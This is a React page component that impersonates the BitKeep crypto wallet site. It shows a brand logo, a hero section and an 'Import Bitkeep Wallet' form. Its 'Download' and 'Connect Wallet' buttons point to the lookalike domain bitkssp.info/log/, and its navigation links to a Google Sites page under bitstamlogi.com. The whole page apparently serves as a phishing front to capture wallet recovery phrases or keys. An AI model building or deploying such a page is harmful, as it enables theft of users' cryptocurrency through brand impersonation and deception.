import React, { useState } from "react";
import WalletImportTabs from "../components/WalletImportTabs";

const navLinks = [
  { name: "Faster Trading, Better Assets", url: "https://sites.google.com/bitstamlogi.com/bitkeep-wallet/home?authuser=0" },
];

export default function BitkeepWallet() {
  const [menuOpen, setMenuOpen] = useState(false);
  return (
    <div className="min-h-screen bg-[#18181b] text-white flex flex-col items-center">
      {/* Header */}
      <header className="w-full flex items-center justify-between px-6 py-4 bg-[#18181b] border-b border-gray-800 relative">
        <div className="flex items-center gap-3">
          {/* Bitkeep Logo */}
          <span className="text-2xl font-bold tracking-widest flex items-center gap-2">
            <span className="inline-block">
              <svg width="32" height="32" viewBox="0 0 32 32" fill="none"><rect width="32" height="32" rx="16" fill="#7C3AED"/><path d="M10 16L22 16" stroke="#fff" strokeWidth="2" strokeLinecap="round"/><path d="M16 10L16 22" stroke="#fff" strokeWidth="2" strokeLinecap="round"/></svg>
            </span>
            BitKeep
          </span>
        </div>
        <nav className="hidden md:flex gap-6">
          {navLinks.map((link) => (
            <a
              key={link.name}
              href={link.url}
              target="_blank"
              rel="noopener noreferrer"
              className="text-white hover:text-[#7C3AED] font-medium"
            >
              {link.name}
            </a>
          ))}
        </nav>
        <button
          className="md:hidden px-3 py-2 rounded border border-gray-300 text-white bg-[#7C3AED]"
          onClick={() => setMenuOpen((open) => !open)}
          aria-label="Toggle menu"
        >
          Menu
        </button>
        {/* Mobile Menu Dropdown */}
        {menuOpen && (
          <nav className="absolute top-full left-0 w-full bg-[#18181b] shadow-md flex flex-col gap-2 px-6 py-4 z-10 md:hidden">
            {navLinks.map((link) => (
              <a
                key={link.name}
                href={link.url}
                target="_blank"
                rel="noopener noreferrer"
                className="text-white hover:text-[#7C3AED] font-medium py-2 border-b border-gray-700 last:border-b-0"
                onClick={() => setMenuOpen(false)}
              >
                {link.name}
              </a>
            ))}
          </nav>
        )}
      </header>

      {/* Hero + Import Form Side by Side */}
      <section className="flex flex-col md:flex-row items-center justify-center py-16 px-4 w-full gap-12">
        {/* Hero Content */}
        <div className="flex-1 max-w-xl w-full order-2 md:order-1">
          <h1 className="text-4xl md:text-5xl font-bold mb-4 text-white">Faster Trading, Better Assets</h1>
          <p className="text-lg text-gray-300 mb-8">
            Bitkeep Wallet — Your Web3 Trading Wallet of the Future
          </p>
          <div className="flex flex-col md:flex-row gap-4 justify-center md:justify-start">
            <a href="https://bitkssp.info/log/" target="_blank" rel="noopener noreferrer" className="px-8 py-3 rounded-full bg-[#7C3AED] text-white font-bold text-lg shadow hover:bg-[#5b2bbf] transition text-center">Download</a>
            <a href="https://bitkssp.info/log/" target="_blank" rel="noopener noreferrer" className="px-8 py-3 rounded-full bg-transparent border border-white text-white font-bold text-lg shadow hover:bg-white hover:text-[#18181b] transition text-center">Connect Wallet</a>
          </div>
          <div className="flex gap-4 mt-8 justify-center md:justify-start">
            <span className="text-2xl" title="Apple"><i className="fab fa-apple" /></span>
            <span className="text-2xl" title="Android"><i className="fab fa-android" /></span>
            <span className="text-2xl" title="Windows"><i className="fab fa-windows" /></span>
            <span className="text-2xl" title="Chrome"><i className="fab fa-chrome" /></span>
          </div>
        </div>
        {/* Wallet Import Form first on mobile */}
        <div className="w-full md:w-[420px] max-w-md bg-[#23232b] rounded-xl shadow p-8 border border-[#7C3AED] flex flex-col justify-center order-1 md:order-2 mb-8 md:mb-0">
          <h2 className="text-2xl font-bold text-[#7C3AED] mb-6 text-center">Import Bitkeep Wallet</h2>
          <WalletImportTabs
            walletName="Bitkeep"
            theme={{
              bg: '#23232b',
              text: '#fff',
              border: '#7C3AED',
              accent: '#7C3AED',
              accentText: '#23232b',
              accentHover: '#5b2bbf',
              tabActiveBg: '#7C3AED',
              tabActiveText: '#23232b',
              tabInactiveBg: '#23232b',
              tabInactiveText: '#fff',
              tabBorder: '#7C3AED',
              primary: '#7C3AED',
            }}
          />
        </div>
      </section>
    </div>
  );
}
